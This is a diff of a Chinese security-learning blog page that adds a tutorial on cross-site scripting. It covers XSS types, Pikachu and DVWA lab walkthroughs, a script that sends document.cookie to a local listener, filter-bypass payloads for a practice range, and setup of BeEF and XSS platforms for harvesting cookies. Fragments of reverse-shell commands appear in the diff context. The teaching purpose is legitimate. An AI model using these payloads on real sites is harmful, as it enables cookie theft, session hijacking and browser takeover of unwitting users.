@@ -454,14 +454,14 @@ bash -i //容">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    31.6k
+                    33.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    133 分
+                    141 分
                 </div>
                 
 
@@ -3241,8 +3241,224 @@ array(0&#x3D;&gt;$sock, 1&#x3D;&gt;$sock, 2&#x3D;&gt;$sock),$pipes);&#39;<span a
 
 
 
+<h2 id="XSS跨站脚本攻击原理及分类"><a href="#XSS跨站脚本攻击原理及分类" class="headerlink" title="XSS跨站脚本攻击原理及分类"></a>XSS跨站脚本攻击原理及分类</h2><p>XSS是由于<strong>Web应用程序对用户的输入过滤不足</strong>而产生的，攻击者利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害者用户可能采取Cookie窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
+<h3 id="XSS案例"><a href="#XSS案例" class="headerlink" title="XSS案例"></a>XSS案例</h3><p>有一段PHP代码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>访问： <a target="_blank" rel="noopener" href="http://127.0.0.1/?a=">http://127.0.0.1/?a=</a><script>alert("XSS")</script></p>
+<p><img src="/2022/09061/117.PNG" alt="117"></p>
+<p>输入的参数 <script>alert("XSS")</script> 被当成了js的代码，并且执行了</p>
+<h3 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h3><p>XSS 被称为跨站脚本攻击（Cross Site Scripting），由于和CSS 重名，所以改为XSS。</p>
+<p>XSS 就是将恶意代码注入到网页中，以达到攻击的效果。</p>
+<p>XSS主要使用javascript，javascript 可以非常灵活的操作html、css和浏览器。</p>
+<p>XSS产生在前端，受目标浏览器内核的影响。IE浏览器会检测XSS并拦截。</p>
+<h4 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害"></a>XSS危害</h4><p>XSS漏洞执行的通常是JavaScript代码，一切js代码能做到事情，XSS就可以做。</p>
+<ul>
+<li>网络钓鱼，包括盗取各类用户账号</li>
+<li><strong>窃取用户cookies</strong>，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作</li>
+<li>劫持用户(浏览器)会话，执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件</li>
+<li>强制弹出广告页面、刷流量</li>
+<li>进行大量的客户端攻击、DDoS攻击</li>
+<li>传播跨站脚本蠕虫</li>
+</ul>
+<p><strong>案例：</strong></p>
+<p>2011.3.26日起，github收到ddos攻击</p>
+<ul>
+<li>第一轮：百度统计的js文件被劫持篡改，每2秒向github上的两个页面发出请求，被github的弹窗警告拦住</li>
+<li>第二轮：跨网域<img>攻击，被github检查referer拦住</li>
+<li>第三轮：DDOS攻击github Pages</li>
+<li>第四轮：SYN flood,利用TCP协议缺陷发送大批伪造的TCP链接请求，耗尽GitHub的资源</li>
+</ul>
+<h3 id="XSS漏洞搜索"><a href="#XSS漏洞搜索" class="headerlink" title="XSS漏洞搜索"></a>XSS漏洞搜索</h3><p>有输出回显的地方都有可能产生XSS漏洞</p>
+<h3 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h3><p>根据XSS的触发特性，可以将XSS分为反射型XSS、存储型XSS、DOM型XSS。</p>
+<p><strong>反射型</strong>：每次触发漏洞的时候，都要将恶意代码通过GET/POST方式提交，然后触发漏洞</p>
+<p><strong>存储型</strong>：恶意代码被服务器存储，在访问页面的时候会被直接触发（如留言板等场景）</p>
+<p><strong>DOM型</strong>：恶意代码不经过后端服务器处理，直接在浏览器中执行</p>
+<h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>Pikachu靶场，Cross-Site Scripting</p>
+<p>在本浏览器构造一个XSS的链接</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//www.pikachu.com/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28%27123%27%29%3C%2Fscript%3E&amp;submit=submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/09061/118.PNG" alt="118"></p>
+<p><strong>本关字符限制是20个字符，在构造payload时要改相关网页代码参数</strong></p>
+<p><strong>其他浏览器尝试结果：</strong></p>
+<p><img src="/2022/09061/119.PNG" alt="119"></p>
+<p><strong>图解：</strong></p>
+<p><img src="/2022/09061/120.PNG" alt="120"></p>
+<ol>
+<li><p>黑客构造有问题的链接</p>
+</li>
+<li><p>发送钓鱼链接给受害者</p>
+</li>
+<li><p>受害者访问链接</p>
+</li>
+<li><p>受害者在浏览器中执行注入的scirpt代码</p>
+</li>
+<li><p>用户完全不知情！</p>
+</li>
+</ol>
+<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>Pikachu靶场，Cross-Site Scripting</p>
+<p>将js恶意代码写入留言板中，前面可以加东西进行伪装</p>
+<p><img src="/2022/09061/122.PNG" alt="122"></p>
+<p><strong>测试结果</strong></p>
+<p><img src="/2022/09061/123.PNG" alt="123"></p>
+<p>此时只要其他用户看到该条留言，js恶意代码就会执行</p>
+<p><strong>图解：</strong></p>
+<p><img src="/2022/09061/121.PNG" alt="121"></p>
+<p>黑客将js代码注入到了服务器的数据库中，导致所有用户在访问该页面时，都会执行这一段js代码。</p>
+<h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p><strong>代码操作DOM树：</strong></p>
+<p><img src="/2022/09061/124.PNG" alt="124"></p>
+<p>使用js代码来刷新页面，没有经过后端的服务器</p>
+<p>Pikachu靶场，Cross-Site Scripting</p>
+<p>DOM xss-x</p>
+<p><strong>输入：</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'>&lt;img src="#" onmouseover="alert('</span>xss'<span class="token punctuation">)</span>"<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/09061/125.PNG" alt="125"></p>
+<p>分析源码：</p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xssd_main<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+        <span class="token keyword">function</span> <span class="token function">domxss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">var</span> str <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">;</span>
+            <span class="token keyword">var</span> txss <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"text="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取输入内容</span>
+            <span class="token keyword">var</span> xss <span class="token operator">=</span> txss<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将输入中的“/\+/g”用空格替代</span>
+            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"dom"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"&lt;a href='"</span><span class="token operator">+</span>xss<span class="token operator">+</span><span class="token string">"'>就让往事都随风,都随风吧&lt;/a>"</span><span class="token punctuation">;</span><span class="token comment">//将修改后的内容进行拼接</span>
+       <span class="token punctuation">&#125;</span>
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请说出你的伤心往事<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dom<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>#<span class="token punctuation">'</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token value javascript language-javascript"><span class="token function">domxss</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">'</span></span></span><span class="token punctuation">></span></span>有些费尽心机想要忘记的事情,后来真的就忘掉了<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onmouseover</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>'>就让往事都随风,都随风吧<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>其他payload</strong></p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html">'><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>注意：</strong>消除闭合符</p>
+<p>总结：Dom型就是完全在前端中进行操作，然后触发并执行js代码</p>
+<h4 id="反射型XSS和DOM型XSS"><a href="#反射型XSS和DOM型XSS" class="headerlink" title="反射型XSS和DOM型XSS"></a>反射型XSS和DOM型XSS</h4><ul>
+<li><p>反射型XSS会将参数发送到后端的服务器中，服务器经过查询或其他的操作后，又将该字符串完整的返回到了页面上</p>
+</li>
+<li><p>DOM型XSS没有经过后端服务器的处理，直接在浏览器中执行js代码操作DOM</p>
+</li>
+</ul>
+<h3 id="XSS实例"><a href="#XSS实例" class="headerlink" title="XSS实例"></a>XSS实例</h3><p>哪些页面容易出现跨站漏洞</p>
+<ul>
+<li>注册页面</li>
+<li>在线咨询的输入位置(与服务器有交互)</li>
+<li>论坛留言</li>
+</ul>
+<h4 id="Cookie-amp-Session"><a href="#Cookie-amp-Session" class="headerlink" title="Cookie&amp;Session"></a>Cookie&amp;Session</h4><p>一些网站有自动登录的功能，并且可以在不退出浏览器的情况下，保留你的登录状态。这个<strong>自动登录的功能，就是使用了cookie</strong>，而<strong>保留登录状态则使用了session</strong>。</p>
+<p>以B站为例，登录一次之后，很长一段时间就不需要我们输入账号和密码了。</p>
+<p><strong>cookie就是每次在http请求时，自动发送数据给服务器的技术。</strong></p>
+<p><img src="/2022/09061/126.PNG" alt="126"></p>
+<p>浏览器中也可以查看保存的cookie**(也可以安装扩展cookie editor)**</p>
+<p>F12进入控制台，输入 document.cookie即可查看</p>
+<p><img src="/2022/09061/127.PNG" alt="127"></p>
+<p>或者在应用程序中，查看存储</p>
+<p><img src="/2022/09061/128.PNG" alt="128"></p>
+<p>使用cookie就可以免用户名和密码进行登录。</p>
+<h4 id="使用XSS盗取Cookie"><a href="#使用XSS盗取Cookie" class="headerlink" title="使用XSS盗取Cookie"></a>使用XSS盗取Cookie</h4><p>环境：</p>
+<p>本地DVWA靶场(pikachu环境的也可以)</p>
+<p>等级：low</p>
+<p>登录 smithy / password，等级设为low</p>
+<p>在 XSS Stored 中，注入以下js代码</p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8000?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>在127.0.0.1开启http服务监听，使用python快速开启</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 <span class="token operator">-</span>m http<span class="token punctuation">.</span>server<span class="token operator">//</span>开启http<span class="token punctuation">.</span>server服务
+ctrl<span class="token operator">+</span>c或者httpd<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span>关闭http<span class="token punctuation">.</span>server服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>刷新任意用户的 存储性XSS的页面，等级为low的会直接将cookie当做http get的参数传给开启的服务器</p>
+<p><img src="/2022/09061/129.PNG" alt="129"></p>
+<p><strong>注意：自己访问，留言加一，返回cookie;其他人访问，留言数不变，返回cookie</strong></p>
+<p>使用Cookie Editor浏览器插件修改cookie，实现登录(也可以使用burp抓包修改)</p>
+<h3 id="XSS靶场训练"><a href="#XSS靶场训练" class="headerlink" title="XSS靶场训练"></a>XSS靶场训练</h3><p>靶场链接：</p>
+<p><a target="_blank" rel="noopener" href="https://xss.haozi.me/">https://xss.haozi.me</a></p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(1)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>clickme<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+0x03
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+0x04
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;script>parent.alert<span class="token entity" title="&#40;">&amp;#40;</span>1<span class="token entity" title="&#41;">&amp;#41;</span>&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+0x05
+    --!><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+0x06
+    type=image src onerror
+	=alert(1)
+0x07
+    &lt;svg onload=alert(1) /
+    &lt;svg onload=alert(1) 
+0x08
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+0x09
+    https://www.segmentfault.com"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span>
+<span class="token number">0x0a</span>
+    https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>segmentfault<span class="token punctuation">.</span>com<span class="token punctuation">.</span>haozi<span class="token punctuation">.</span>me<span class="token operator">/</span>j<span class="token punctuation">.</span>js
+    https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>segmentfault<span class="token punctuation">.</span>com@xss<span class="token punctuation">.</span>haozi<span class="token punctuation">.</span>me<span class="token operator">/</span>j<span class="token punctuation">.</span>js
+<span class="token number">0x0b</span>
+    <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://www.segmentfault.com.haozi.me/j.js"</span><span class="token operator">></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+0x0c
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sscriptcript</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.segmentfault.com.haozi.me/j.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sscriptcript</span><span class="token punctuation">></span></span>
+0x0d
+	asasdad
+	alert(1)
+	-->
+0x0e
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ſcript</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.segmentfault.com.haozi.me/j.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+0x0f
+	'),alert(1)//
+0x10
+	alert(1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
+
+<h3 id="XSS过滤绕过"><a href="#XSS过滤绕过" class="headerlink" title="XSS过滤绕过"></a>XSS过滤绕过</h3><p>绕过参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html">绕过XSS过滤姿势总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sfsec/p/15178028.html">XSS绕过总结</a></p>
+<h2 id="XSS平台利用"><a href="#XSS平台利用" class="headerlink" title="XSS平台利用"></a>XSS平台利用</h2><h3 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h3><p>XSS平台是测试XSS漏洞获取并接收数据的测试使用的Web平台。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xss8.cc/">https://xss8.cc/</a></li>
+<li><a target="_blank" rel="noopener" href="https://xss.pt/">https://xss.pt/</a></li>
+<li>自己搭建</li>
+</ul>
+<h4 id="XSS平台搭建"><a href="#XSS平台搭建" class="headerlink" title="XSS平台搭建"></a>XSS平台搭建</h4><h5 id="BlueLotus-XSSReceiver"><a href="#BlueLotus-XSSReceiver" class="headerlink" title="BlueLotus_XSSReceiver"></a>BlueLotus_XSSReceiver</h5><p>XSS打cookie工具：<strong>BlueLotus_XSSReceiver</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sqlsec/BlueLotus_XSSReceiver">https://github.com/sqlsec/BlueLotus_XSSReceiver</a></p>
+<p><strong>使用：</strong></p>
+<p><img src="/2022/09061/130.png" alt="130"></p>
+<p><img src="/2022/09061/131.png" alt="131"></p>
+<p>将生成的payload注入目标网站，得到cookie返回信息</p>
+<p><img src="/2022/09061/132.png" alt="132"></p>
+<h5 id="xss-platform"><a href="#xss-platform" class="headerlink" title="xss_platform"></a>xss_platform</h5><p><a target="_blank" rel="noopener" href="https://github.com/anwilx/xss_platform">https://github.com/anwilx/xss_platform</a></p>
+<h3 id="Beef平台"><a href="#Beef平台" class="headerlink" title="Beef平台"></a>Beef平台</h3><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p>推荐测试时在kali中安装，实战时需要在公网服务器上安装</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">apt-get install beef-xss -y
+# 如果安装失败，先执行下面的命令
+apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="启停Beef"><a href="#启停Beef" class="headerlink" title="启停Beef"></a>启停Beef</h4><pre class="line-numbers language-none"><code class="language-none">beef-xss
+beef-xss-stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>首次启动时，需要设置一个登录账号和密码</p>
+<h4 id="注入xss"><a href="#注入xss" class="headerlink" title="注入xss"></a>注入xss</h4><p>启动beef时，会弹出js的路径，将此路径构造成xss的payload注入即可</p>
+<p><img src="/2022/09061/133.PNG" alt="133"></p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>在目标上线后，commands标签里有各种模块</p>
+<p><img src="/2022/09061/134.PNG" alt="134"></p>
+<h5 id="执行任意JaveScript"><a href="#执行任意JaveScript" class="headerlink" title="执行任意JaveScript"></a>执行任意JaveScript</h5><p>在Misc -&gt; Raw JavaScript中可以执行任意js代码</p>
+<p><img src="/2022/09061/135.PNG" alt="135"></p>
+<h5 id="获取Cookie"><a href="#获取Cookie" class="headerlink" title="获取Cookie"></a>获取Cookie</h5><p><img src="/2022/09061/136.PNG" alt="136"></p>
+<h5 id="社工利用"><a href="#社工利用" class="headerlink" title="社工利用"></a>社工利用</h5><p><img src="/2022/09061/137.PNG" alt="137"></p>
 
                 
             </div>
